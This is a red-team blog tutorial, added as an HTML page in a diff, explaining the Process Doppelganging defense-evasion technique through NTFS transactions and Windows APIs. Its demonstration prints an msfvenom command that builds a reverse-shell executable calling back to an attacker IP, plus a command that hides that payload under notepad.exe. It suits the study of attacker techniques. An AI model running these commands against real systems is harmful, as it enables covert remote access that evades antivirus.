@@ -1,0 +1,132 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/defense-evasion/" rel="category tag">Defense Evasion</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Process Doppelganging (Mitre:T1055.013)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/process-doppelganging-mitret1055-013/" rel="bookmark"><time class="entry-date published" datetime="2022-04-14T17:43:09+00:00">April 14, 2022</time><time class="updated" datetime="2025-06-23T18:30:29+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Eugene Kogan and Tal Liberman presented a technique for defense evasion called “Process Doppelganging” in Blackhat EU 2017 which can be found <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf">here</a> </span></strong>and a video of the session <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.youtube.com/watch?v=Cch8dvp836w">here</a></strong></span>. In this method, we use NTFS transactions to create a dummy file containing our payload, which creates a new NTFS memory section with our payload. And then, rolling back the dummy file making the malware exist only in memory (our newly created section). Then this section can be loaded to a new process and be executed under disguise. We’ll see this in action in live code.</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>MITRE TACTIC: Defense Evasion (TA0005) and Privilege Escalation (TA0004)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE Technique ID: Process Injection (T1055)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE SUB ID: Process Doppelganging (T1055.013)</strong></span></li>
+</ol>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>File systems</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>FAT</strong></span></li>
+<li><span style="color: #000000;"><strong>NTFS</strong></span></li>
+<li><span style="color: #000000;"><strong>Working of NTFS</strong></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>NTFS Transactions</strong></span></li>
+<li><span style="color: #000000;"><strong>Process Doppelganging</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration</strong></span></li>
+<li><span style="color: #000000;"><strong>Drawbacks</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">File systems</span></h3>
+<p><span style="color: #000000;">Before we proceed further, it is necessary to know a little about Windows Filesystems. They store files and directories in physical memory in small clusters (logical blocks) while they maintain a table of index to refer to where they store each file and in which cluster. Windows supports two major file systems: FAT and NTFS</span></p>
+<h4><span style="color: #000000;">FAT: </span></h4>
+<p><span style="color: #000000;">File Allocation Table is the legacy format to maintain hard disks, removable storage etc. They come in three formats FAT12, FAT16 AND FAT32. Each of these versions provides a different cluster size and different maximum file size. For example, FAT12 only supported files as large as 32 MB while the newer FAT32 supports files up to 32GB (theoretical limit 16 TB) with a cluster size of 8 KB. They are wisely used in storage medias that have to be used on different operating systems (windows, Linux, macOS).</span></p>
+<h4><span style="color: #000000;">NTFS: </span></h4>
+<p><span style="color: #000000;">Windows developed the New Technology File System (<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/ntfs-overview">NTFS</a></strong></span>) that is the most popular file system in Windows OS. It overcame various FAT limitations and had the following features:</span></p>
+<ul>
+<li><span style="color: #000000;">Large File Size Limit: 16 exabytes</span></li>
+<li><span style="color: #000000;">Larger size of cluster: varying from 4KB to 2048 KB depending on file size. Refer <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10)?redirectedfrom=MSDN">here</a></strong></span>. So, if a file is 4 Gb, it gets divided in 1 million 4Kb clusters (approx.). Or even if the file size is 4.1 Kb, it gets divided in 2 clusters each of size 4KB (4+0.1 KB in clusters)</span></li>
+<li><span style="color: #000000;">Journaling file system: It maintains a record of changes ($Logfile) so that it can recover data following a system failure/corruption</span></li>
+<li><span style="color: #000000;">Supports inbuilt encryption (turns file name to blue if encrypted)</span></li>
+<li><span style="color: #000000;">Supports file permission model on memory (RWX)</span></li>
+<li><span style="color: #000000;">Limited Cross OS compatibility.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5edNGTx6SYRVTSBKoHlfIqy5t4WpL1itzYE_myrcoLZTYn3yti26-W_Je4KfyfpqvJ2ofSSrXzzThidqaxWwQmFUR9U1VgNsO3Fr49_mFoqbNFZEG6dpRCrhCRq-3M9drbIW8wA1xqMAWy4suBiF4htcl0lNRHI21d2jYW5JQDVcQ9vVg1oJWmDP0Jw/s16000/1.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Working of NTFS: </strong></span></h5>
+<p><span style="color: #000000;">NTFS uses a B-Tree directory schema to keep track of file clusters. It already has various built-in memory spaces for things like:</span></p>
+<ul>
+<li><span style="color: #000000;">$BOOT: Contains boot manager sequence which helps an OS to start up</span></li>
+<li><span style="color: #000000;">$MFT: Master File Table is an index of all the files present on the directory. Any lookup is done by referring to this table.</span></li>
+<li><span style="color: #000000;">$MFTMir: Master File Table Mirror is a redundant MFT for backup purposes.</span></li>
+<li><span style="color: #000000;">$FileSystemData: Contains misc data not in MFT</span></li>
+<li><span style="color: #000000;">Refer <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10)?redirectedfrom=MSDN">here</a> </strong></span>for more functions.</span></li>
+</ul>
+<p><span style="color: #000000;">So, when an HDD is formatted and files stored in it, MFT gets updated with the knowledge of the file clustering and value in each cluster. Next time a user looks up the file, MFT refers to that physical location and loads the file.</span></p>
+<h3><span style="color: #800000;">NTFS Transactions</span></h3>
+<p><span style="color: #000000;">Essentially memory is a 2D matrix containing references to files and OS variables. Much like the transactions in databases, transactions in NTFS are also possible which lets a user play with the memory segments. One can manually perform operations on a particular NTFS sector(memory segment) and input data in it using various Windows APIs provided by Microsoft.</span></p>
+<p><span style="color: #000000;">Transactions encapsulate a series of operations into a single unit. Hence, they can treat multiple operations as an integrated unit transaction that executes if each and every transaction returns true, or fails entirely even if a single transaction fails.</span></p>
+<p><span style="color: #000000;">Windows API functions on NTFS transactions can be referred to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-gb/windows/win32/api/ktmw32/nf-ktmw32-createtransaction?redirectedfrom=MSDN">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Read more about Transactions <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://en.wikipedia.org/wiki/Transactional_NTFS">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;">Process Doppelganging</span></h3>
+<p><span style="color: #000000;">Now that we have established an understanding of Transactions on NTFS, let’s understand Process Doppelganging. In this method, NTFS transactions are used to create a dummy file containing our payload, which creates a new NTFS memory section with our payload. And then, rolling back the dummy file making the malware exist only in memory (our newly created section). Then this section can be loaded to a new process and be executed under disguise. Let’s understand this via code contributed by Hasherezade <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/hasherezade/process_doppelganging/blob/master/main.cpp">here</a></strong></span>.</span></p>
+<h5><span style="color: #000000;"><strong><span style="color: #000000;">Step 1:</span> </strong></span></h5>
+<p><span style="color: #000000;">Create a new NTFS transaction, which is nothing but an operation on the memory space. Windows has provided the following function to do this:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateTransaction()</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuos_qDdtggvGUyFs5V1cWs2nGHFdLyFxnobTKIXyamXVGkkbOI8PggLuGponIq-x3KXOo5W5-aBvXTt38DrgW2Z6z4Lt980L5fOLgUqxKm-gT533BPkQxyRHws9xUUzrWrtR3cefnpscaFjaFB3F3ZsZ5FcMyyB7Wj66DfMl2D_h8kFkgeTqpSFwuhQ/s16000/2.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 2: </strong></span></h5>
+<p><span style="color: #000000;">Inside this transaction, we create a dummy file to store the payload. This reserves a space equivalent to the size of our malicious payload in the section.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateFileTransacted()</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje00N3wLT3qsCmSa1Ye_6T1uOXHV8livwL2NuA9uU5WkAGO3xfRuE1u_1eTndk5Qpu9rDThmspMI97V0QaZWT2eDqTOYHfvxtBMTD3n5X8HpFnsvZataj5A4-1ENBBRvn_z_kUY2ewbyKI6pJrGmEGXin_RAgORiK-_8OVEYPEnjA_0pInYyS4lQAs6Q/s16000/3.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 3: </strong></span></h5>
+<p><span style="color: #000000;">Using the above function, we have now prepared to generate our dummy file. We now need to create a new section to store this.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateSection()</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNYW7vR38El5tphRciHteHz-O0440PVf2ZS87wJaZfQ4mXxF2HPLMs11R_cYRMIptaMhNXWgPmevj3M1KA9Naxtdy0tk-1a1Nbyz0_tYXJdii3hFsyS7S5XgrUZbVZgFf_KBfrHUWyEejDvcl-4gqGepQdF692WQinx_EGtJyJ_VSts8wTgGltKlUsPg/s16000/4.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 4: </strong></span></h5>
+<p><span style="color: #000000;">Now that we have create a section, including our dummy file with our payload in it, we no longer need our file and the payload can exist in memory, i.e., “fileless payload.” We can now rollback our transaction and delete this dummy file. This would not delete our section and our payload lives in it.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>RollbackTransaction()</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih0Oi1CY5IXeJzHbw9cn_jW79r27p073c0EA6KDlqNd7GzgVJ_XbITqxsnsszJ5q--nMM1x8umlpeLIu-7b0ju8t86o46soYSs8YmkVlL9qtacds1Qu8_DVbujTSCoOqH4a2spsSFH6_z7r99YwiPjRR5VSldqby2FQeIdM5RhIxFLcsj4_KbhQ8JEFg/s16000/5.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 5: </strong></span></h5>
+<p><span style="color: #000000;">Now the malicious code is stored in a section. We need to create a new process and attach this section to it. This is the “doppelganger process”</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>NtCreateProcessEx(): </strong>It can load a process using a section containing PE content too as well as a PE File!</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2-3NTxAXweeSm8AdRhym50St3g6LvTYc-KmRdXGob2may0lCfU4Uir2GehSF3fLiw30fIekYcs4BhJIDSjX2eZ--E9Egfmg8a8t8XoTeR-iG3Z1uCBTaF_jcbwS7umWdobhzJqFQr-IRpwQFUGesAvbOSIyAeCQShzXb1ebKza2Gv6RpL6CoRXy3iBQ/s16000/6.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 6: </strong></span></h5>
+<p><span style="color: #000000;">Finishing. We need to fill some of the process paramters manually and link it to the current PEB for the process to run properly. Refer the code for how it is done. The supporting function used is:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Setup_process_paramters</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2yqeirJsrujQ5RkEM5U2cNeSjG3pXd9vUD1phvmjpD7hzX5doMIvqyibthhyq9Sk0l6USYF67rpTkPuRyTh2CgCBmGgM0PIcrtF752MW-o8yRTLFH2AMCWsO1waN3Rq3E-EeUzA_kdgX7w_NTKcvhfBqTmRxK8kDvgVo9OaedAAgTBi3Z2-v-A2-geA/s16000/7.png"/></span></p>
+<h5><span style="color: #000000;"><strong>Step 7: </strong></span></h5>
+<p><span style="color: #000000;">Point EAX to the entry point and create a new thread to start execution.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateThreadEx</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEip1dvRZhdNHuue1hdmGwIZUgk9QxW1zPvC1JntPXwxeoNy55krIddohriBH5S2lCY3nTLhwVThQTWp75qGfVdgbVnvGDZST-WLcR2WpgrzEQJ1UsPQhKml4Ic4bemWQgEhmZCzT9mX3E28LjwmARjSz7QJ_mPZmwZyCnQXRFvHINS4AfpRpCzSLiD8jg/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">That’s it! That’s all the steps. Let’s see this in action now.</span></p>
+<h3><span style="color: #800000;">Demonstration</span></h3>
+<p><span style="color: #000000;">Before we begin, please note that Windows 10 is detecting this attack as the defender has updated the signatures associated with Doppelganging. When detected, it looks like:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQ2haqoa2jTVX49Pvomrme2bSrTXJ19y13C48hc4jLZcJdw67GEDcssSdOknG9GkWmlSTq-Z-3CD3dADN1i6lOjP4knC6CloEbLyAQnXoRN9aUmSKFnBNFKuTojln4489eUMiUnQUR352MbBDiKgBIlalLiDZ-ESW0xsV4FcL1CM-cekwvt0RRzD7vcg/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Please refer to the CARO naming convention to understand this naming.</span></p>
+<p><span style="color: #000000;">Hence, we will use Windows 7/8/8.1 to execute the attack. First, we need to create a malicious Exe using msfvenom</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.89 LPORT=1234 -f exe &gt; hello.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgarSgYbE5SV2n4Qz0gKGYP0CpAC52LzmNkmrrS7NDr_M5fZ8F24wUA5Y0c-g_s9hAjME1zxFlXXmCYvoke6zQT8CuCaqR5_SJ63fHwWsEbtlh3v6KG1sqGvTkN_SJP49_g0trZT-x1qPdcC5ZsNmgcow6Kwj2Oibcw1Z69phSDUd3oCqKths3Y8ySaiQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Once created, we can send this to our victim and launch Process Doppelganging attack using Hasherezade’s executables. To run this, we just need to provide the malicious file and the file in which we will hide our payload in. Here, I am using a file called “hex.txt” which is a simple notepad file.</span></p>
+<p><span style="color: #000000;">Thus, hello.exe shall be running under the notepad.exe process thus evading defenses!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">proc_doppel32.exe hello.exe hex.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhq1Z9f_9T0Rr6-eGBlH9uoGjqfI6YY50WKCGC2Idb2YyS3SSCHI0xEfH7Ve4s3XoE9aDGxTvsIQCP6xhGR6axmcenoDkdp0L4Q4MoeYJc3QIUhKZ1Y7m1VuZOffP2_VYDz32_Na6TbMQNhS4x-zKmXK8NXQtb2EXtuY_APwQpNXoJ5aDPcA-LliE1sLg/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Upon inspecting current processes in process explorer, we will see that a cmd is active under notepad.exe! Unusual, right?</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimp8-B59-rhN_lqBjl88dTLedIwG5HMDZt1co-LkfGCCkEMZvyA99vL4IBDfF6iN-XneAomEpuE4OFDlRQAcdvCC-IXbQzDj9HjcWWp8Ngxcs1flyTlRhvmEJCPewxHUnr38GYy6I09JriZtxVfRYuM7d27KIvsWpCGvzwsIbZR-cop3Ri5XzJv_Ur_g/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">If everything works, we will successfully see a reverse shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZEwNfts5PQrfhY0bTt9jFTEuil-9Un42mz_koIlf8gYRVtg_LjY8qbm7I_eblK-WP4-kDUZNEUz_c_FtewJIae-48y0Hq3Dhd5JRQMXSLWSKboigfgQxBHRFuKnL_Vb4xOkPXmluigapQVwc7Z4gC2w6kbZlTmwqbf30dyDCww7aahm96m-wY0jfxQA/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;">Drawbacks</span></h3>
+<p><span style="color: #000000;">Well, if everything works then what’s the problem? We do not wish to leave anyone reading this under false pretenses of this attack working on modern systems. There are various drawbacks that have to be considered:</span></p>
+<ul>
+<li><span style="color: #000000;">Cannot replace any file you like; like svchost.exe which gives access denied error</span></li>
+<li><span style="color: #000000;">Functions like CreateThreadEx and NtCreateProcessEx have a unique signature and are easily detectable by AV now (in Windows 10 above)</span></li>
+<li><span style="color: #000000;">This is an outdated technique. Running on Win 10 gives some users the BSOD error too. Hence, we recommend using Process Ghosting instead. Refer <a style="color: #000000;" href="https://www.hackingarticles.in/process-ghosting-attack/">here</a>. This attack also follows the same methodology but instead of using NTFS transactions and rolling it back, it uses the “DELETE_PENDING” flag to inject payload in memory.</span></li>
+</ul>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">The article highlighted a famous defense evasion technique that various APTs and malware campaigns had used in the past. We talked about the misuse of various Microsoft’s Win32 APIs that make this abuse possible and also, demonstrated the PoC of the attack. A skilled attacker can easily customize the PoC code, evade previously detected signatures of functions like NtCreateProcessEx and use alternate functions that can do the same thing; and implement the Process Doppelganging technique for defense evasion. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong><span style="color: #000000;"> </span><span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
